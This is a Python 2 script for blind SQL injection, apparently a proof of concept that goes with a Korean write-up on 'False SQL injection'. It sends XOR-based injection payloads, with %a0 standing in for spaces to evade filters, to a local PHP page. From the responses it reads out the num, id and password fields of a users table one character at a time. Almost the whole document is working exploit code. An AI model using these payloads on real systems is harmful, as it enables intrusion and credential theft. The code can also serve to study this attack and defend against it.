#!/usr/bin/python

### blind.py ###

import urllib
import sys
import os



def put_data(true_url, true_result, field, index, length):
	for i in range(1, length+1):
		for j in range(32, 127):
			attack_url = true_url + "^(%%a0locate%%a0%%a0(0x%x,(%%a0select%%a0%s%%a0%%a0from%%a0%%a0users%%a0where%%a0num=%d),%d)=%d)" % (j,field,index,i,i)
			attack_open = urllib.urlopen(attack_url)
			attack_result = attack_open.read()
			attack_open.close()

			if attack_result==true_result:
				ch = "%c" % j
				sys.stdout.write(ch)
				break
	print "\t\t",

def get_length(false_url, false_result, field, index):
	i=0
	while 1:
		data_length_url = false_url + "^(%%a0(select%%a0octet_length%%a0%%a0(%s)%%a0from%%a0users%%a0where%%a0num%%a0=%%a0%d)%%a0=%%a0%d)" % (field,index,i)
		data_length_open = urllib.urlopen(data_length_url)
		data_length_result = data_length_open.read()
		data_length_open.close()
		if data_length_result==false_result:
			return i
		i+=1

url = "http://127.0.0.1/info.php"

true_url = url + "?num=1"
true_open = urllib.urlopen(true_url)
true_result = true_open.read()
true_open.close()
	
false_url = url + "?num=0"
false_open = urllib.urlopen(false_url)
false_result = false_open.read()
false_open.close()


print "num\t\tid\t\tpassword"
fields = "num", "id", "password"

for i in range(1, 4):
	for j in range(0, 3):
		length = get_length(false_url, false_result, fields[j], i)
		length = put_data(false_url, true_result, fields[j], i, length)
	print ""

To its regret, the attack test is stopped for no time, if anyone not this writer studies some attack codes additionally, it will be easy for him to develop the attack.

# Korean document: http://wh1ant.kr/archives/[Hangul]%20False%20SQL%20injection%20and%20Advanced%20blind%20SQL%20injection.txt

